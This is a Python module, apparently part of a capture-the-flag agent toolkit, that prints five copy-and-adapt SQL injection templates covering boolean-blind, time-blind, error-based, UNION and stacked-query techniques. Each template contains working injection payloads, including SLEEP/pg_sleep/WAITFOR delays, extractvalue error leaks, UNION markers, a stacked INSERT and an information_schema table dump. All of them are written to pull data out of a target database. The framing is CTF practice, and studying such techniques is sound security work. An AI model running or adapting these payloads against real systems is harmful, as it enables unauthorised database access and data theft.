"""Copy-and-adapt specs, one per injection shape. ``python -m ctfagent.kit.templates``.

The point of a template is that adapting it is *mechanical*: change the URL,
change the wrapping, change the TRUE/FALSE test. Everything else — calibration,
bisection, retry, proxy isolation — stays in :mod:`ctfagent.kit.sqli` and is
never copied.

Five shapes, ordered by cost. Always try the cheap one first: an error-based or
UNION path reads a whole value per request, blind reads ~7 characters per
request's worth of value. Dropping to blind before ruling out UNION is the
single most expensive habit in this area.

Which one this target supports is a *finding*, not a preference — record it.
"""

from __future__ import annotations

import sys

__all__ = ["TEMPLATES", "main"]

BOOLEAN = r'''"""Boolean blind. ~7 requests/char. `id` is the injectable parameter."""
from ctfagent.kit import Session, BoolOracle, Extractor

s = Session("http://TARGET:PORT")

def probe(cond):
    r = s.get("/check", {"id": f"1' AND ({cond}) AND '1'='1"})
    if not r.status:
        return None                       # transport failure ≠ FALSE
    return '"exists": true' in r.text     # <-- what TRUE looks like here

o = BoolOracle(probe).calibrate()         # raises if the two answers are the same
flag = Extractor(o, max_length=128).read("SELECT flag FROM flag LIMIT 1")
print(repr(flag))
'''

TIME = r'''"""Time blind. Same search loop; the oracle is a measured delay."""
from ctfagent.kit import Session, TimeOracle, Extractor

s = Session("http://TARGET:PORT")
SLEEP = "IF(({0}),SLEEP(2),0)"          # mysql; pg: (CASE WHEN ({0}) THEN pg_sleep(2) END);
                                        # mssql: IF({0}) WAITFOR DELAY '0:0:2';
                                        # sqlite: CASE WHEN ({0}) THEN <heavy CTE> ELSE 0 END

def probe(cond):
    r = s.get("/item", {"id": f"1 AND {SLEEP.format(cond)}"})
    return r.elapsed if r.status else None

# delay=2.0 must match SLEEP above: calibration needs the gap ≥ delay/2.
o = TimeOracle(probe, delay=2.0, samples=3).calibrate()
print(Extractor(o, max_length=128).read("SELECT flag FROM flag LIMIT 1"))
'''

ERROR = r'''"""Error-based. One request per value once the error text leaks."""
from ctfagent.kit import Session, ErrorOracle, Extractor

s = Session("http://TARGET:PORT")

def probe(cond):
    # MySQL: extractvalue/updatexml carry the value into the error message.
    #   extractvalue(1, concat(0x7e,(SELECT ...),0x7e))
    # SQL Server: convert(int,(SELECT ...))
    # sqlite: abs(-9223372036854775808) on the TRUE branch
    r = s.get("/err", {"id": f"1' AND abs(CASE WHEN ({cond}) THEN -9223372036854775808 ELSE 1 END)--"})
    return r.text if r.status else None

# The pattern is what only the TRUE branch produces. Calibration proves it
# fires for 1=1 and not for 1=2 — a generic 500 page fires for both and reads
# every condition as TRUE.
o = ErrorOracle(probe, pattern=r"integer overflow").calibrate()
print(Extractor(o, max_length=128).read("SELECT flag FROM flag LIMIT 1"))
'''

UNION = r'''"""UNION. One request per value — ~50x cheaper than blind. Count columns first."""
from ctfagent.kit import Session, UnionOracle

s = Session("http://TARGET:PORT")
COLS = 2                                   # find with: ORDER BY 1..N until it errors

def probe(expr):
    # Bracket the value with a marker and find it by the marker. Do NOT take
    # "the last <li>": the database decides the order of UNION rows — measured
    # on the local control, the injected row sorted last for one expression and
    # first for the next.
    r = s.get("/search", {"q": f"1' UNION SELECT 1,'SQ'||{expr}||'LI'-- -"})
    if not r.status:
        return None
    for item in r.text.split("<li>")[1:]:
        value = item.split("</li>")[0]
        if value.startswith("SQ") and value.endswith("LI"):
            return value[2:-2]
    return ""

o = UnionOracle(probe).calibrate()         # sends a marker, proves it comes back
print(o.extract("(SELECT flag FROM flag LIMIT 1)"))
print(o.extract("(SELECT group_concat(table_name) FROM information_schema.tables)"))
'''

STACKED = r'''"""Stacked queries. Needs a driver that allows `;` (PDO/multi-statement)."""
from ctfagent.kit import Session, StackedOracle, Extractor

s = Session("http://TARGET:PORT")

def probe(cond):
    # The second statement's effect is observable: a row appears, a counter
    # moves, a file is written. Do not stack a write on a target you have to
    # leave working — read side effects only unless the challenge says otherwise.
    r = s.get("/item", {"id": f"1'; INSERT INTO log(v) SELECT CASE WHEN ({cond}) THEN 'A' ELSE 'B' END;-- -"})
    if not r.status:
        return None
    probe2 = s.get("/log")
    return "'A'" in probe2.text

o = StackedOracle(probe).calibrate()
print(Extractor(o, max_length=128).read("SELECT flag FROM flag LIMIT 1"))
'''

TEMPLATES: dict[str, str] = {
    "bool": BOOLEAN,
    "time": TIME,
    "error": ERROR,
    "union": UNION,
    "stacked": STACKED,
}

_ORDER = ("error", "union", "bool", "time", "stacked")


def main(argv: list[str] | None = None) -> int:
    argv = sys.argv[1:] if argv is None else argv
    if argv and argv[0] in TEMPLATES:
        print(TEMPLATES[argv[0]])
        return 0
    if argv:
        print(f"未知模板 {argv[0]!r}；可选：{', '.join(_ORDER)}", file=sys.stderr)
        return 2
    print(__doc__)
    for name in _ORDER:
        print(f"\n{'=' * 72}\n# {name}\n{'=' * 72}")
        print(TEMPLATES[name])
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
